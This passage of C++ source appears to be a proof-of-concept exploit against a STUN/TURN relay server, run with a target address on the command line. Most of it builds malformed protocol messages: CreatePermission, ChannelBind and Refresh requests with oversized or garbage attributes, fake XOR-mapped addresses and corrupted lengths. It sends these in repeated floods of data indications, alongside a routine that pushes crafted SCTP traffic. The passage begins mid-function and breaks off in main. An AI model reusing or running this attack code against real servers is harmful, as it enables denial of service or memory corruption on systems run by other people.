		patt = (stun_attribute*) (ptrdiff_t(&patt->offset)+ntohs(patt->size));

	}else 
	{
	   //add fake nonce 
	   static char tmp[0x100]={};
	   gen_random_string(tmp,0x100);
	   std::string sasl = fake_sasl_prep(tmp);
	   patt->attribute_type = htons(0x15);
	   patt->size = htons(0x100);
	   memcpy(&patt->offset, sasl.c_str(),std::min(sasl.length(),size_t(0x100)));
 	   patt = (stun_attribute*) (ptrdiff_t(&patt->offset)+ntohs(patt->size));
	}
	return patt;
}
//
int allocate_channel(int sock) 
{

	int ret =0;
	size_t offset =0;
	char allocate_request[16384*2]={};
	//memset(allocate_request,0xff,16384*2);
	sockaddr_in fake_xor_address;
	stun_attribute* fingerprint =nullptr;

	time_t t; time(&t);
	bool bind_success = (ntohs(((stun_header*)(packet))->msg_type)==0x101);

	std::string raw_time = ctime(&t);
    std::string fake =    fake_sasl_prep(std::string("::::")+(raw_time.c_str())) ;

	std::cout<<"[+]Generating fake xor mapped address attribute "<<std::endl;
	fake_xor_address.sin_addr.s_addr = peer_addr.sin_addr.s_addr ^ htonl ( 0x2112A442);

 	if(child&&parent_port!=MAP_FAILED&&parent_port)
		fake_xor_address.sin_port = *parent_port ^ ( 0x2112A442 >> 16);
	else if(!child && child_port!=MAP_FAILED&&child_port)
		fake_xor_address.sin_port = *child_port ^ ( 0x2112A442 >> 16);
	else 
		fake_xor_address.sin_port = peer_addr.sin_port ^ ( 0x2112A442 >> 16);

 
	stun_header* oi   = reinterpret_cast<stun_header*>  (&packet[0]);
	stun_header* vey   = reinterpret_cast<stun_header*>  (&allocate_request[0]);
	std::cout<<"[+] Last response = "<< std::hex<< ntohs(oi->msg_type) << std::dec << "[+] msg_len = "<<ntohs(oi->msg_len)<< std::endl;
	if(oi->id.tid.longpart[0]!=0){
	memcpy(&vey->id ,&oi->id,sizeof(UInt128));
	}
	else
	{
		if ( random_port()%5==0 )
			bzero (&vey->id,sizeof(UInt128) ); // test transaction 0
			else  
			gen_random_string((char*)&vey->id,sizeof(UInt128));
		vey->id.magicCookie = htonl(0x2112a442);//override with cookie
	
	}

	
  	sync_ports();
   	vey->msg_type =htons (CREATE_PERMISSION);
	{
	stun_address_attribute* p_attr = (stun_address_attribute*) &allocate_request[sizeof(stun_header)] ;	
	stun_attribute* p_address = (stun_attribute*) &packet[sizeof(stun_header)];
	uint8_t reserved=0;
	size_t counter=0;

	uint8_t family = IPv4Family ; //0x666 instead of 1;
	//copy dummy type
	size_t total_size = (realm?MOD4(ntohs(realm->size)):0)+(nonce?MOD4(htons(nonce->size)):0)+MOD4( sizeof(stun_address_attribute)+sizeof(stun_header)+ 0x666 +0x200+MOD4(0x20)+MOD4(0x10));


	vey->msg_len =htons (MOD4(total_size+0x100) );
	p_attr->attribute_type = htons(0x0016); //Xor-peer-addr or XOR-MAPPED-ADDRESS ?
	
	offset = sizeof(stun_address_attribute) ;
	
	//if the bind success  is on use real mapped address  :
	if (bind_success) {

		stun_address_attribute* pattr;
		pattr =  (stun_address_attribute*)&packet[sizeof(stun_header)];
		while ( pattr && pattr->attribute_type!=htons(0x20) )
			pattr=(stun_address_attribute*) ptrdiff_t(pattr)+ htons(pattr->size);

		if(pattr->attribute_type==htons(0x20 ))
			memcpy(&p_attr->addr,&pattr->addr,htons(pattr->size));

		p_attr->reserved=0;
		p_attr->size = htons(offset ); // override w/IP4
		p_attr->family_type=pattr->family_type;
		p_attr->port = pattr->port;
		

	}else{
	p_attr->size = htons(offset ); //IP4
	p_attr->reserved=0;
	p_attr->family_type = 1;
	p_attr->port = (fake_xor_address.sin_port);
	p_attr->addr.s_addr = (fake_xor_address.sin_addr.s_addr); //change this line to run the poc from a differnt host.
	}
	
	*(uint16_t*)&allocate_request[MOD4(sizeof(stun_header)+sizeof(stun_address_attribute))] = htons(0x013) ;//type ...
	*(uint16_t*)&allocate_request[MOD4(sizeof(stun_header)+sizeof(stun_address_attribute))+2]=htons(0x666); //data length
   
    gen_random_string(&allocate_request[MOD4(sizeof(stun_header)+sizeof(stun_address_attribute))+4],0x666);
   
    stun_attribute* patt = (stun_attribute*) &allocate_request[MOD4((sizeof(stun_header)+sizeof(stun_address_attribute)+0x66e))];


	patt->attribute_type = htons ( 0x0026) ;//htons(8);//large digest or data //fake large google attribute 
	patt->size = htons(0x200);
	gen_random_string(&patt->offset,0x200);
	patt = (stun_attribute*) (ptrdiff_t(&patt->offset)+(0x200));// &allocate_request[MOD4((sizeof(stun_header)+sizeof(stun_address_attribute)+0x66e +0x200))];

	patt= add_nonce_realm(patt);
	
	patt->attribute_type=htons(0x0006); //USERNAME
	patt->size=htons(0x20);//username 

	memcpy((char*)&patt->offset,fake.c_str(),fake.size()); // . 
 
  	//memcpy((char*)&patt->offset,CREATE_PERMISSION_USER_PREFIX_TEST,9); //override with suffix . 
  
	patt= (stun_attribute*) ( ptrdiff_t(patt)+MOD4(0x20));
	//add error code : 
	patt->attribute_type=htons(0x0009);//error code
	patt->size=htons(0x10);
	gen_random_string(&patt->offset,12);
	//patt->offset=0;
	patt= (stun_attribute*) ( ptrdiff_t(patt)+MOD4(0x10));


	patt->attribute_type = htons(0x8028);//fingerprint
	patt->size = htons(4);
	uint32_t v=htonl(crc32(0,(u_char*)&allocate_request[0],ntohs( vey->msg_len ))^0x5354554E);
	 memcpy(&patt->offset,&v,4);
	 fingerprint = patt;
    #if DUMMY_INTEGRITY
	 patt = (stun_attribute*)  MOD4( (((ptrdiff_t ) patt ) + (attrib_size+4))); 
	 patt->attribute_type = htons(8);
	 patt->size=htons(0x100);

	 memset (&patt->offset,0xFF,0x100);
	#endif
 	std::cout<<"[bind msg len] = "<<ntohs(vey->msg_len)<<std::endl;
	std::fflush(NULL);
 	do { 
		std::cout<<"[+] sending " << ntohs( vey->msg_len )+sizeof(stun_header) << std::endl; 
		ret =  ::sendto(sock,allocate_request,sizeof(stun_header)+ntohs(vey->msg_len),0,(struct sockaddr*)&peer_addr ,sizeof(peer_addr) ) ;

   	} while (ret==0);

	if(ret>0)
	{
		struct timeval tv;
		tv.tv_sec = 1;
		tv.tv_usec = 666;
		setsockopt(sock,SOL_SOCKET,SO_RCVTIMEO,(const char*)&tv,sizeof(tv));

		 std::cout<< "[+] calling recvfrom "<<std::endl;
		 ret = ::recvfrom(sock,packet,65535,0, /**/0,0);
		 std::cout<<"[+] recvfrom returned :"<<ret<<std::endl; 

	}
	}
	// REQUESTED_TRANSPORT 
	// LIFETIME
	// EVEN-PORT
	// REQUESTED-ADDRESS-FAMILY 
	// MESSAGE-INTEGRITY
	// FINGERPRINT 
 
	int32_t v=0;

 	vey->msg_type= htons(0x009); //channel-bind instead of allocate request
	offset = sizeof(stun_header)+sizeof(stun_address_attribute)+offset;
	stun_attribute* p_attr = (stun_attribute*) &allocate_request[offset] ;	
	vey->msg_len = MOD4( offset +(attrib_size*6)+MOD4(0x20) +0x666 +0x200 )+(realm?MOD4(ntohs(realm->size)):-12)+(nonce?MOD4(htons(nonce->size)):-12);

	p_attr = (stun_attribute*)&allocate_request[MOD4(sizeof(stun_header)+sizeof(stun_address_attribute))]  ;//type ... // (stun_attribute*) &allocate_request[MOD4(sizeof(stun_header)+sizeof(stun_address_attribute))];

	p_attr->attribute_type = htons(0x0019);
	p_attr->size = htons(4);
	p_attr->offset=0x11;	
 	//offset+= ( attrib_size+4) ;
	 offset = MOD4(offset)-4;
	p_attr= reinterpret_cast<stun_attribute*>(&allocate_request[offset]);
	p_attr->attribute_type = htons(0x000d);//lifetime
	p_attr->size = htons(4);
	v= htonl(9600);
		memcpy (&p_attr->offset, &v,4);
 	offset+= ( attrib_size ) ;
	  offset = MOD4(offset);
	p_attr= reinterpret_cast<stun_attribute*>(&allocate_request[offset]);
	p_attr->attribute_type = htons(0x0018);//even-port
	p_attr->size = htons(4);
 	v=0;
	memcpy (&p_attr->offset, &v,4);
 	offset+= ( ntohs(p_attr->size)) ;
	 	 offset = MOD4(offset);

	p_attr= reinterpret_cast<stun_attribute*>(&allocate_request[offset]);

 	p_attr->attribute_type = htons(0x002A);//RFC6062 connection_id
		p_attr->size = htons(4);

	   v=htons(channel_id);//-channel number
	  // 	   v=htonl(0xFFFFFFFF);//--1 connection-id

	   memcpy (&p_attr->offset, &v,2);
	   v=0;
	   *((uint16_t*)((char*)&p_attr->offset+2))=0;
   
 	   offset+= ( ntohs(p_attr->size)) ;
	   offset = MOD4(offset);

	p_attr= reinterpret_cast<stun_attribute*>(&allocate_request[offset]);
 	p_attr->attribute_type = htons(0x0019);//requested-family
	p_attr->size = htons(4);
 	//v=htonl(0x00000011);
	//	memcpy (&p_attr->offset, &v,4);
	p_attr->offset = 0x11;
	*(uint32_t*)((char*)&p_attr->offset+1)=0ul;
 	offset+= ( ntohs(p_attr->size)) ;
	 	 offset = MOD4(offset);

	p_attr= reinterpret_cast<stun_attribute*>(&allocate_request[offset]);
	p_attr->attribute_type =htons(0x12) ;//htons(8);
	p_attr->size = htons(0x200);
	gen_random_string( &p_attr->offset,0x1ff);
	{
			stun_address_attribute* paddr = (stun_address_attribute*)p_attr;
			paddr->family_type=2;
			paddr->reserved=0;
	}
  	offset+= MOD4( ntohs(p_attr->size)) ;
	//offset = (offset);

	p_attr= reinterpret_cast<stun_attribute*>(&allocate_request[(offset)]); //fingerprint

	p_attr = add_nonce_realm(p_attr);
 
 	p_attr->attribute_type=htons(0x0006); //USERNAME
	p_attr->size=htons(0x20);//username 
	memcpy((char*)&p_attr->offset,fake.c_str(),fake.size()); //just first byte . 
	//	memcpy((char*)&p_attr->offset,CREATE_PERMISSION_USER_PREFIX_TEST,9); //override with suffix . 

	p_attr= (stun_attribute*) ( ptrdiff_t(p_attr)+MOD4(ntohs(p_attr->size)));

	
 	p_attr->attribute_type = htons(0x8028);//fingerprint
	p_attr->size = htons(4);
	
	v=htonl(crc32(0,(u_char*)&allocate_request[0],vey->msg_len)^0x5354554E);
		memcpy (&p_attr->offset	, &v,4);
	
	//vey->msg_len=htons(MOD4(offset+4)-20); //  htons(MOD4(offset));
	vey->msg_len = htons(vey->msg_len);
	p_attr= (stun_attribute*) ( ptrdiff_t(p_attr)+MOD4(ntohs(p_attr->size)));
    p_attr->attribute_type = htons(0x026); 
	p_attr->size = htons(ntohs(vey->msg_len) -0x28e + (nonce?0:+4));
  
	std::cout<<"[+] sending " << ntohs( vey->msg_len ) << std::endl; 
	ret =  ::sendto(sock,allocate_request,sizeof(stun_header)+ntohs(vey->msg_len),0,(struct sockaddr*)&peer_addr ,sizeof(peer_addr) ) ;
	std::cout<<"[+] sent "<<ret;

	std::fflush(NULL);

	if(ret>0)
	{
		vey->msg_type = htons(0x03);// send again with allocate :D  
				ret =  ::sendto(sock,allocate_request,sizeof(stun_header)+ntohs(vey->msg_len),0,(struct sockaddr*)&peer_addr ,sizeof(peer_addr) ) ;

 		 std::cout<<"[+]  ignoring recvfrom" <<std::endl; 
		  	std::fflush(NULL);

			  return channel_id;
	}
 	return channel_id;
}

int send_malformed_refresh_response(int sock,int channel_id)
{
	static char send_buffer[MOD4(65535)]={} ;
	static bool sent = false;
	int ret=-1;
	memset ( send_buffer,0xFF, 65535-1 );

	stun_header* pheader = (stun_header*)&send_buffer[0];
	stun_header* ppack = (stun_header*)&packet[0];

	stun_attribute* p_attr= reinterpret_cast<stun_attribute*>(&send_buffer[MOD4(sizeof(stun_header)+0x20)]);
	stun_address_attribute* p_a =reinterpret_cast<stun_address_attribute*>(&send_buffer[sizeof(stun_header)]);


	struct sockaddr_in fake_xor_address;
 	fake_xor_address.sin_addr.s_addr = peer_addr.sin_addr.s_addr ^  htonl( 0x2112A442);   
	if(child&&parent_port!=MAP_FAILED&&parent_port)
		fake_xor_address.sin_port = *parent_port ^ ( 0x2112A442 >> 16);
	else if(!child && child_port!=MAP_FAILED&&child_port)
		fake_xor_address.sin_port = *child_port ^ ( 0x2112A442 >> 16);
	else 
			fake_xor_address.sin_port = peer_addr.sin_port ^ ( 0x2112A442 >> 16);


	//copy header
	pheader->magicCookieAndTid = ppack->magicCookieAndTid;
	
 	pheader->msg_type = (random_port()%1==0)?htons(0x0004):htons(0x0114); //Turn refresh
	size_t head_size = sizeof(stun_header);
	pheader->msg_len = htons  (MOD4(0x1164));
 	//XOR-relayed address fake ipv6 :
	p_a->attribute_type =htons(0x0016);//htons(0x0016); //XOR-RELAYED 
	p_a->reserved=0;
	p_a->family_type = 2;//0x39;//unknown
	p_a->port  = fake_xor_address.sin_port;
	p_a->size = htons(32);
	p_a->addr.s_addr = fake_xor_address.sin_addr.s_addr;//garbage ipv6. 

	//garbage XOR relayed address : 
 
 	p_attr->attribute_type = htons(0x0009) ;//error code 
	p_attr->size = htons(16);
	//fake_sasl_prep();
	gen_random_string(&p_attr->offset,15); 
	//memcpy(&p_attr->offset,	fake_sasl_prep( (const char*)&p_attr->offset).c_str(), 	fake_sasl_prep( (const char*)&p_attr->offset).size());
	
	p_attr= reinterpret_cast<stun_attribute*>( ptrdiff_t(p_attr)+MOD4(16) );
	 	
//	p_attr->attribute_type=htons(0x0026);//padding
//	p_attr->size=htons(0x28);
	p_attr->attribute_type=htons(0x0006); //USERNAME
	p_attr->size=htons(0x28);//username 
	std::string fake =  fake_sasl_prep(CREATE_PERMISSION_USER_PREFIX_TEST);

	memcpy((char*)&p_attr->offset,fake.c_str(),fake.size() ); //override with suffix . 
	p_attr= reinterpret_cast<stun_attribute*>( ptrdiff_t(p_attr)+MOD4(0x28) );
	
	p_attr->attribute_type = htons(0x20);//htons(8);
	p_attr->size=htons(0x100);
	gen_random_string(&p_attr->offset,0x100);
	p_attr= reinterpret_cast<stun_attribute*>( ptrdiff_t(p_attr)+MOD4(0x100) );
	p_attr->attribute_type = htons(0x0022);
	p_attr->size = htons(0x1000-4);
	gen_random_string(&p_attr->offset,0x1000);
	//send the dummy refresh
	ret=  ::sendto(sock,send_buffer,ntohs( pheader->msg_len)+head_size,0,(struct sockaddr*)&peer_addr ,sizeof(peer_addr) ) ;
	if(ret>0){
		
		struct timeval tv;
		tv.tv_sec = 1;
		tv.tv_usec = 666;
		setsockopt(sock,SOL_SOCKET,SO_RCVTIMEO,(const char*)&tv,sizeof(tv));
		std::cout<< "[+] allocate channel calling recvfrom , not overriding bind response packet : "<<std::endl;
 
 		ret = ::recvfrom(sock,send_buffer,65535,0, /**/0,0);

		std::cout<<"[+] recvfrom returned :"<<ret<<std::endl; 
		 if(ret>0) 
			parse_attributes((u_char*)send_buffer); //update nonce /etc.. if needed
		 	stun_header* pheader  = (stun_header*) &send_buffer[0];
			uint16_t type = ntohs(pheader->msg_type);
			std::cout<<"[+] msg_type = "<<ntohs(((stun_header*)send_buffer)->msg_type)<<std::endl;
			if(( type==0x0114) ||(type ==0x0111) )
			{
				std::cout<<"[+]sending empty refresh back..."<<std::endl;
				pheader->msg_type=htons(0x114);
				memcpy(&packet[sizeof(stun_header)],&send_buffer[sizeof(stun_header)],ret);
				ret = ::sendto(sock,send_buffer,ntohs( pheader->msg_len)+head_size,0,(struct sockaddr*)&peer_addr ,sizeof(peer_addr) ) ;
			} 
			else{

				std::cout<<"[+] great success;";
			}
	}
	
	
	return ret;
}
 
int send_data(int sock, char* data , size_t data_size,int channel_id , size_t count/*=10*/,uint16_t _random_port/*=0*/,bool test4k/*=false*/)
{
	
	static char send_buffer[MOD4(65535)]={} ;
	static bool sent = false;
	int ret=-1;
	memset ( send_buffer,0xFF, 65535-1 );
	stun_header* pheader = (stun_header*)&send_buffer[0];
	stun_header* ppack = (stun_header*)&packet[0];
	size_t head_size;
 	if (!sent){
	pheader->magicCookieAndTid = ppack->magicCookieAndTid;


	pheader->msg_len = htons (    MOD4( (data_size-0x100)  +sizeof(stun_address_attribute)+sizeof(stun_header)+4+0x02d8 ));
	pheader->msg_type = random_port()%9==0?htons(0x0007): htons(SEND_INDICATION); //Send Indication
	head_size = sizeof(stun_header);
    if(random_port()%9==0){
		 			memcpy(&send_buffer[head_size],rtcp,71);
			*((uint16_t*)&send_buffer[406])= htons(ntohs(pheader->msg_len)-(head_size+406)); //set rtcp extension len

	}
	}
	else
	{
		channel_header* chann= (channel_header*)&send_buffer[0];
		chann->channel_id = htons(channel_id);
		chann->size = htons (    MOD4( (data_size-0x100)  +sizeof(stun_address_attribute)+8 ));
		head_size = 4;
		//copy rtp sender report into the data header:
		//OVERRIDE WITH DATA BUFFER
		if (random_port()%2==0)
		{
 			memcpy(&send_buffer[head_size],rtcp,71);
			*((uint16_t*)&send_buffer[406])= htons(ntohs(pheader->msg_len)-(head_size+406)); //set rtcp extension len

		}else  if(  random_port()%3){
				  memcpy(&send_buffer[head_size],tls_header,sizeof(tls_header)/sizeof(tls_header[0]));
		}

	}
 	size_t offset = MOD4(sizeof(stun_address_attribute)+(attrib_size)+(data_size-0x100)+12);
	
	stun_attribute* fingerprint= (stun_attribute*)&data[ offset];

	if(head_size>4)
    {
		memcpy ( &send_buffer[head_size],data,data_size);

	
	if(fingerprint->attribute_type== htons(0x8028))
	{
		std::cout<<"[+]fingerprint offset"<<std::endl;
	}
	else
	{
		std::cerr<<"[-]wrong offset : "<< offset <<std::endl;
 		exit(-1);
	}
	stun_attribute* p_attr= (stun_attribute*) &send_buffer[offset+head_size];
		if(p_attr->attribute_type== htons(0x8028))
	{
		std::cout<<"fingerprint offset"<<std::endl;
				uint32_t
	v=htonl(crc32(0,(u_char*)&send_buffer[0], offset +attrib_size )^0x5354554E);
		memcpy (&p_attr->offset	, &v,4);

	}
	else
	{
		std::cerr<<"[-]wrong offset : "<< offset <<std::endl;
 		exit(-1);
	}
	}
 	//	update_data_fingerprint(send_buffer,MOD4(pheader->msg_len),MOD4(sizeof(stun_address_attribute)+(attrib_size*2)+8));
 	std::cout<<"[+] send_data called with " << ntohs(pheader->msg_len) <<" to send"<<std::endl;
	std::cout<<"[+] sending " << ntohs( pheader->msg_len ) << " bytes "<< std::endl; 

	ret=  ::sendto(sock,send_buffer,ntohs( pheader->msg_len)+head_size,0,(struct sockaddr*)&peer_addr ,sizeof(peer_addr) ) ;
		std::cout<<"[+] sendto returned "<<ret<<std::endl;

		size_t counter=0;

		do {
		if(head_size>4){
			//send more malformed refresh requests:
			// =	send_malformed_refresh_response(sock,channel_id);
			//std::cout<<" [+] malformed refresh returned "<<ret <<"bytes"<<std::endl;
		pheader->msg_type = htons(0x0017); // DATA indication


 			memcpy(&send_buffer[head_size],rtcp,71);
			*((uint16_t*)&send_buffer[406])= htons(ntohs(pheader->msg_len)-(head_size+406)); //set rtcp extension len

		//p_attr->attribute_type = htons(0x0013); // htons(0x8028);
		//p_attr->size = htons(4);

		}
		else{
			
			pheader->msg_type = htons(0x0016);
			gen_random_string(&send_buffer[head_size],406);

		 }
		 
		std::cout<<"[+] sending  with data indication " << ntohs( pheader->msg_len ) << std::endl; 
		{
			//update fingerprint
			uint32_t
			v=htonl(crc32(0,(u_char*)&send_buffer[0], offset +attrib_size )^0x5354554E);
			memcpy (&fingerprint->offset	, &v,4);
		}
  		ret=  ::sendto(sock,send_buffer,ntohs( pheader->msg_len) + head_size,0,(struct sockaddr*)&peer_addr ,sizeof(peer_addr) ) ;
		std::cout<<"[+] sendto returned "<<ret<<std::endl;
	
	if(!sent){
		if( pheader->msg_type==ntohs(0x0017))
		    pheader->msg_type=htons(0x0016); 
		else
			pheader->msg_type = htons(0x0017);

		if(rand()%9==0)gen_random_string((char*)(&pheader->msg_type),10) ;

	}
			 sent = true;

 			std::fflush(NULL);
		}
		while ( ++counter < count);
		
		std::cout<<"waiting for recvfrom...."<<std::endl;

		ret = ::recvfrom(sock,packet,65535,0, /**/0,0);
		std::cout<<"[+] recvfrom returned :"<<ret<<std::endl; 

	return ret;
}

void prepare_data(char* data,size_t nlen,int sock)
{
	struct sockaddr_in fake_xor_address;
	int ret=0;
	time_t t; time(&t);
	std::string raw_time = ctime(&t);
	std::cout<<"[+]generating fake xor mapped address attribute ret="<<ret<<std::endl;
	fake_xor_address.sin_addr.s_addr = peer_addr.sin_addr.s_addr ^  htonl( 0x2112A442);   
	if(child&&parent_port!=MAP_FAILED&&parent_port)
		fake_xor_address.sin_port = *parent_port ^ ( 0x2112A442 >> 16);
	else if(!child && child_port!=MAP_FAILED&&child_port)
		fake_xor_address.sin_port = *child_port ^ ( 0x2112A442 >> 16);
	else 
			fake_xor_address.sin_port = peer_addr.sin_port ^ ( 0x2112A442 >> 16);
	//fake_xor_address.sin_port = local.sin_port ^ ntohs( 0x2112A442 >> 16);
	//prepare data attributes. 
	//F
	stun_address_attribute* p_attr = (stun_address_attribute*) &data[0];
	p_attr->attribute_type = htons(0x0012) ;//Xor-Peer-Address
	p_attr->size =  sizeof(stun_address_attribute);
	p_attr->family_type = 0x1;//F**k it up.
	p_attr->reserved =0;


	p_attr->port = fake_xor_address.sin_port;
	p_attr->addr = fake_xor_address.sin_addr;

	stun_attribute* p_s = (stun_attribute*) & data[MOD4(p_attr->size)];
	p_attr->size = htons(p_attr->size);
	p_s->attribute_type = htons(0x0022);
	p_s->size = htons(nlen-0x100);

	//std::string b = buffer;
	gen_random_string(&p_s->offset ,nlen-0x100);

	const std::string context = std::string("process(" + std::to_string(getpid()) + ") port (" + std::to_string(ntohs(p_attr->port)))  + ") time =["+ raw_time+"]\n\n";
	memcpy ( &p_s->offset, context.c_str(),context.length() );
	p_s->size =MOD4( nlen -( attrib_size+sizeof(stun_address_attribute)+0x100 )  ) ;
	p_s->size = htons(p_s->size);
	std::cout<< " prepared data attributes buffer with DATA size of "<<ntohs(p_s->size);
	p_s = (stun_attribute*) &data[MOD4(ntohs(p_attr->size)+sizeof(stun_address_attribute)+attrib_size+(nlen-0x100))];
	p_s->attribute_type=  htons(0x8028);
	p_s->size=htons(4);
	//set temporary
	int v=htonl(crc32(0,(u_char*)&data[0],nlen)^0x5354554E);
		memcpy (&p_s->offset	, &v,4);
	p_attr = (stun_address_attribute*) &data[MOD4(ntohs(p_attr->size)+sizeof(stun_address_attribute)+attrib_size+(nlen-0x100)-28)];
	p_attr->attribute_type= htons(0x802c); // htons(32811);//response-origin
	p_attr->family_type=1;
	p_attr->reserved=0;
	p_attr->port= peer_addr.sin_port;// ^ htons( 0x2112A442 >> 16);
	p_attr->addr.s_addr = peer_addr.sin_addr.s_addr;// ^htonl(0x2112A442);
	p_attr->size = htons(sizeof(stun_address_attribute));
	stun_attribute * padding= ( (stun_attribute*)&data[MOD4(ntohs(p_attr->size)+sizeof(stun_address_attribute)+attrib_size+(nlen-0x100)-12)]);
	padding->attribute_type=htons(0x0026);
	padding->size=htons(6);
  	std::cout<<"[+] offset =" << (ptrdiff_t)p_s-ptrdiff_t(data)<<std::endl;
}


//
void activate ( const char* target) 
{
	static  char data[32768]={};
	static  char bypass[32768]={};
 	int channel =0;
	int ret=0;
	int so=0,fd=0;

	
        for(auto i=0;i<20;++i)
       	    dummy_bind(target);

	overflow_sctp(peer_addr);
	
	while((so = bind_client(target))>0) 
	{
	

	   std::cout<<"[+]address bind responded with: " << htons(((stun_header*)(&packet[0]))->msg_type) <<std::endl;
	 
	   dummy_bind(target);

	   channel = allocate_channel(so) ;


	   dummy_bind(target);
  		   

	    if(random_port()%333==0)
		{ret = send_malformed_refresh_response(so,channel);
			std::cout<<"[+]\n[+]\n[+]\n[+]\n[+]malformed refresh returned "<<ret<<",channel allocate returned : "<<channel<<std::endl;
 		 }
	  
	   std::cout<<"[+] overriding channel id : "<<std::hex<<channel<<std::dec<<std::endl;
	   while ( so>0 ) 
	   {
		   for(auto i=0;i<20;++i)
			dummy_bind(target,true);

		   prepare_data(data,sizeof(data)/sizeof(data[0]),so); 
		   fd=send_data(so,data,sizeof(data),channel);
		   dummy_bind(target);
		   so=send_data(so,data,sizeof(data),channel,1000);
		   std::cout<<"[+] relay send returned : "<<so;
		   gen_random_string((char*)&global_transaction,sizeof(UInt128));

	   }
	}
}

void overflow_sctp(struct sockaddr_in& address)
{ 
	const int RECVBUFSIZE = 32678;
	const int COUNTER_LIMIT = 1;
	struct sctp_initmsg init,init_msg;
	struct sctp_rcvinfo rinfo;
	struct sctp_sndinfo sinfo;
	static int seq=0;
	static u_int16_t ppid = htonl(3478);
	static u_int16_t sid = random_port();
	int res=0;
	socklen_t fromlen=sizeof(sockaddr_in);
	struct iovec iov,echo[1];
	char buffer[RECVBUFSIZE];
	char send_buffer[RECVBUFSIZE];
	size_t counter = 0;
	const int on = 1;



	memcpy(send_buffer,tls_header,sizeof(tls_header)/sizeof(tls_header[0]));
	memcpy(buffer,tls_header,sizeof(tls_header)/sizeof(tls_header[0]));

	unsigned int infotype=0;
	bzero(&iov,sizeof(iov));
	std::cout<<"[+]==sctp start"<<std::endl;

	int so = socket(PF_INET,SOCK_STREAM,IPPROTO_SCTP);
	if(so==-1){
	std::cerr<<"[=] no sctp support "<<std::endl;
	return ;
	}
	gen_random_string((char*)&rinfo,sizeof(rinfo));
	gen_random_string((char*)&sinfo,sizeof(sinfo));
	
	init.sinit_max_instreams=1; 
	
	if(res = setsockopt(so,IPPROTO_SCTP,SCTP_INITMSG,&init,sizeof(init))==-1)
	{
		std::cerr<<"[=] sctp init error"<<std::endl;
		return ;
	}


	init_msg.sinit_max_attempts=100;
	init_msg.sinit_max_init_timeo=100;
	init_msg.sinit_max_instreams=1000;
	init_msg.sinit_num_ostreams=100;
	iov.iov_base = send_buffer;
	iov.iov_len=sizeof(send_buffer)/sizeof(send_buffer[0]);
	sinfo.snd_sid=ppid;
	sinfo.snd_ppid = sid;
	sinfo.snd_flags=SCTP_UNORDERED;
	sinfo.snd_assoc_id = random_port();
	//sinfo.snd_flags=-1;//SCTP_ADD_STREAMS|SCTP_SENDALL;
	//sinfo.snd_sid = htons();// htons(random_port());
	//sinfo.snd_ppid =0;//htons();// htons(random_port());
	//sinfo.snd_context = htons();
	//sinfo.snd_flags= SCTP_SENDALL;
	echo[0].iov_base = buffer;
	echo[0].iov_len = RECVBUFSIZE;
	uint16_t port = htons(5349);

	if(res = setsockopt(so,IPPROTO_SCTP,SCTP_INITMSG,&init_msg,sizeof(init_msg))==-1)
	{
		std::cerr<<"[=] sctp init 2 error"<<std::endl;
		return ;
	}
	memcpy(send_buffer,tls_header  , sizeof(tls_header)/sizeof(tls_header[0]));
	iov.iov_len = sizeof(tls_header)/sizeof(tls_header[0]) ;

	res = sctp_sendv(so,&iov,1,(struct sockaddr*)&address,1,(void*)&sinfo,sizeof(struct sctp_sndinfo),infotype,0);
	if(res>0)
	{
		std::cout<<"[+] sinfo = "<<std::endl;
		std::cout<<"[+]\t"<<sinfo.snd_sid<<","<<sinfo.snd_context<<","<<sinfo.snd_assoc_id<<","<<sinfo.snd_flags <<std::endl;
	}
	while(res!=-1&&counter++<COUNTER_LIMIT)
	{
		std::cout<<"[+]sctp ===>>>>> great success >>>>> {}"<<std::endl;
		sockaddr_in from=address ;
 		struct timeval tv;
		tv.tv_sec = 1;
		tv.tv_usec = 10;
		setsockopt(so,SOL_SOCKET,SO_RCVTIMEO,(const char*)&tv,sizeof(tv));

		int flags=0 	;
		infotype = 0;
		socklen_t l= sizeof(struct sctp_rcvinfo);
		std::cout<<"[+] sctp getting server key..."<<std::endl;
		 
		

		struct sockaddr_in client_address;
		socklen_t calen = sizeof(sockaddr_in);
		bzero(&client_address,calen);
    	if (setsockopt(so, IPPROTO_SCTP, SCTP_RECVRCVINFO, &on, sizeof(on)) < 0) {
       		 perror("[-] setsockopt SCTP_RECVRCVINFO FAILED");
		return;	
	    	}
   		setsockopt(so, IPPROTO_SCTP, SCTP_AUTHINFO, &on, sizeof(int));
		infotype =SCTP_RECVRCVINFO;
		flags = 0;
		res= sctp_recvv(so,echo,1,(sockaddr*)&client_address,&calen,&rinfo,&l,&infotype,&flags);
		
		if(res>0)
		{
			for(auto i=0;i<10;++i)
				std::cout<<"[+]\t[+][|][+]\t[+]\b\b\b"<<std::endl;
			
			std::cout<<"[+]sctp success"<<std::endl;
			//	rinfo.
			
			std::cout<<"rinfo.rcv_assoc_id,"<<"rinfo.rcv_context,"<<"rinfo.rcv_cumtsn,"<<"rinfo.rcv_flags,"<<"rinfo.rcv_ppid,"<<"rinfo.rcv_sid,"<<
			"rinfo.rcv_ssn,"<<"rinfo.rcv_tsn"<<std::endl;
			
			std::cout<<rinfo.rcv_assoc_id<<","<<rinfo.rcv_context<<","<<rinfo.rcv_cumtsn<<","<<rinfo.rcv_flags
			<<","<<rinfo.rcv_ppid<<","<<rinfo.rcv_sid<<","<<rinfo.rcv_ssn<<","	<<rinfo.rcv_tsn<<std::endl;

		}
		else if (res==0)
		{
						std::cout<<"[+]sctp timeout... retrying ... :P"<<std::endl;
		}
		else if (res==-1)
		{
		
			std::cout<<"[+]==sctp recvv (res=> "<<res<<" "<<std::strerror(errno)<<")"<<std::endl;
		}
		

		if(random_port()%8==0)
		{
			memcpy( &send_buffer[0],sdp_rtpmap,sizeof(sdp_rtpmap)/sizeof(sdp_rtpmap[0]) );
		}

		infotype=0;
		res = sctp_sendv(so,&iov,1,(struct sockaddr*)&address,1,(void*)&sinfo,sizeof(struct sctp_sndinfo),infotype,0);
		//use encapsulation from now on...
		setsockopt(so,IPPROTO_SCTP,SCTP_REMOTE_UDP_ENCAPS_PORT,(const char*)&port,sizeof(uint16_t));

	}
	std::cout<<"[+]==sctp end (res=> "<<res<<" "<<std::strerror(errno)<<
	")"<<std::endl;
	close(so);
	

}
//
int usage ()//
{
	std::cout<<"[+] poc-2022-xxx-xxxx  [target-address]\n";
	return -2;
}
//
int main(int args, char** arg )
{
	if(args<2)  return usage () ; 
	if(parent_port==MAP_FAILED||parent_port==nullptr)
		parent_port =(volatile int*)shared_malloc(sizeof(int));
	if(child_port==MAP_FAILED||child_port==nullptr)
